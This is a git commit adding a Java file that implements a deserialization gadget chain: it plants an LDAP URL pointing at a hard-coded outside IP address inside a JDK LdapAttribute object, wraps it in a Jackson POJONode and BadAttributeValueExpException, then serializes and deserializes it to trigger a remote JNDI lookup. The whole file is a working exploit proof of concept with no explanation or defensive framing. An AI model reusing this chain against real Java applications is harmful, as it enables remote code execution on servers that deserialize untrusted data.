31717ec11e5d20b93428145f46fde0d962bd9ac8
Zer0peach <113846577+Zer0peach@users.noreply.github.com>
2023-11-18 00:37:16 +0800

    Create LdapAttributeChain.java

---
+++ jackson/LdapAttributeChain.java
@@ -0,0 +1,88 @@
+package jackson;
+
+
+import com.fasterxml.jackson.databind.node.ArrayNode;
+import com.fasterxml.jackson.databind.node.BaseJsonNode;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.fasterxml.jackson.databind.node.ValueNode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.rowset.JdbcRowSetImpl;
+import javassist.*;
+import org.springframework.http.HttpEntity;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.ResponseEntity;
+import org.springframework.web.client.RestTemplate;
+
+import javax.management.BadAttributeValueExpException;
+import javax.management.JMX;
+import javax.management.remote.JMXServiceURL;
+import javax.management.remote.rmi.RMIConnector;
+import javax.naming.CompositeName;
+import javax.sql.rowset.BaseRowSet;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.net.URI;
+import java.util.Base64;
+
+/**
+ * Hello world!
+ *
+ */
+public class LdapAttributeChain
+{
+    public static void main( String[] args ) throws Exception {
+        String ldapCtxUrl = "ldap://118.89.61.71:1099/";
+        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
+        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[] {String.class});
+        ldapAttributeClazzConstructor.setAccessible(true);
+        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[] {"name"});
+        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
+        baseCtxUrlField.setAccessible(true);
+        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
+        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
+        rdnField.setAccessible(true);
+        rdnField.set(ldapAttribute, new CompositeName("a//b"));
+        POJONode jsonNodes = new POJONode(ldapAttribute);
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(exp,jsonNodes);
+        deserial(serial(exp));
+    }
+    public static String serial(Object o) throws IOException, NoSuchFieldException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
+        //writeReplaceMethod.setAccessible(true);
+        oos.writeObject(o);
+        oos.close();
+
+        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
+        return base64String;
+
+    }
+
+    public static void deserial(String data) throws Exception {
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+
+    private static void Base64Encode(ByteArrayOutputStream bs){
+        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
+        String s = new String(encode);
+        System.out.println(s);
+        System.out.println(s.length());
+    }
+    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(true);
+        f.set(obj, arg);
+    }
+}
